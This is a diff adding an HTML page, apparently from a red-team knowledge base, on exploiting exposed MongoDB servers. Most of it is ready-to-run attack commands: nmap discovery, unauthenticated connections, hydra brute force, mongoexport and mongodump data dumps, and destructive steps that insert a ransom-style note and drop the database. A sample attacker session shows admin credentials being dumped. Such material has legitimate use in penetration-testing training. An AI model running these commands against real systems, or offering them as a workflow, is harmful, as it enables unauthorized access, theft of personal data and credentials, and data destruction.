@@ -1,0 +1,201 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">MongoDB Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Databases</strong> • Focus: <strong>MongoDB Abuse & Unauthorized Access</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    MongoDB (TCP/27017) is a popular NoSQL database. Older versions and misconfigured 
+    deployments often expose MongoDB without authentication, allowing attackers to 
+    dump or delete entire databases. Exploitation includes brute forcing weak creds, 
+    unauthorized queries, privilege escalation via roles, and injecting malicious 
+    documents. MongoDB has been abused in massive data breaches and ransomware 
+    campaigns where attackers exfiltrate and wipe data while demanding payment.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication (legacy):</strong> Many MongoDB instances historically exposed without auth.</li>
+    <li><strong>Weak Credentials:</strong> Default usernames/passwords often used.</li>
+    <li><strong>Wide Internet Exposure:</strong> Thousands of misconfigured instances found via Shodan.</li>
+    <li><strong>Privilege Escalation:</strong> Over-permissive roles enable data modification/deletion.</li>
+    <li><strong>Ransomware Attacks:</strong> Data exfiltration followed by wiping DB and ransom note injection.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify MongoDB service on TCP/27017.</li>
+    <li><strong>Authentication:</strong> Check if login is required; test weak creds.</li>
+    <li><strong>Enumeration:</strong> List databases, collections, and users.</li>
+    <li><strong>Exfiltration:</strong> Dump sensitive data such as PII or API tokens.</li>
+    <li><strong>Exploitation:</strong> Modify or inject malicious data, drop DB, or insert ransom notes.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for MongoDB on TCP/27017.</li>
+    <li>Attempt connection without authentication.</li>
+    <li>Brute force weak credentials if auth is enabled.</li>
+    <li>Enumerate DBs, collections, and users.</li>
+    <li>Dump sensitive information or poison the database.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p27017 --script mongodb-info [target]
+
+# ------------------------------
+# Connect to MongoDB
+# ------------------------------
+mongo --host [target] --port 27017
+mongo mongodb://user:pass@[target]:27017/admin
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+show dbs
+use admin
+show collections
+db.system.users.find().pretty()
+
+# ------------------------------
+# Dump Data
+# ------------------------------
+mongoexport --host [target] -d users -c accounts --out dump.json
+mongodump --host [target] -d sensitiveDB -o /tmp/dump/
+
+# ------------------------------
+# Brute Force (if auth enabled)
+# ------------------------------
+hydra -l admin -P rockyou.txt [target] mongodb
+
+# ------------------------------
+# Malicious Injection
+# ------------------------------
+db.victims.insert({ "note": "Your DB has been hacked!" })
+db.dropDatabase()
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p27017 --script mongodb-info 192.168.1.50
+mongo --host 192.168.1.50 --port 27017
+show dbs
+db.credentials.find()
+mongoexport --host 192.168.1.50 -d corp -c users --out users.json
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p27017 --script mongodb-info 192.168.1.50
+PORT      STATE SERVICE
+27017/tcp open  mongodb
+| mongodb-info: 
+|   MongoDB Build info
+|   version: 3.6.8
+|   gitVersion: 123abc
+|   modules: none
+|   allocator: tcmalloc
+|   javascriptEngine: mozjs
+
+[ saide ~ ]$ mongo --host 192.168.1.50 --port 27017
+MongoDB shell version v3.6.8
+connecting to: mongodb://192.168.1.50:27017/
+> show dbs
+admin     0.000GB
+corp      0.250GB
+local     0.050GB
+
+> use corp
+switched to db corp
+> show collections
+users
+transactions
+
+> db.users.findOne()
+{
+  "username": "admin",
+  "password": "CorpAdmin2025!"
+}
+
+[+] Credentials dumped from MongoDB
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample MongoDB exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+27017/tcp open  mongodb 3.6.8
+
+# Database Enumeration
+admin
+corp
+local
+
+# Sensitive Data
+db.users.findOne()
+→ username: admin
+→ password: CorpAdmin2025!
+
+# Proof of Exploitation
+Full database dump using mongoexport
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mongodb" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting MongoDB
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1078/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Valid Accounts
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Connect → Enum DBs → Dump creds/data → Poison/Drop DB (optional).</li>
+  </ul>
+</section>
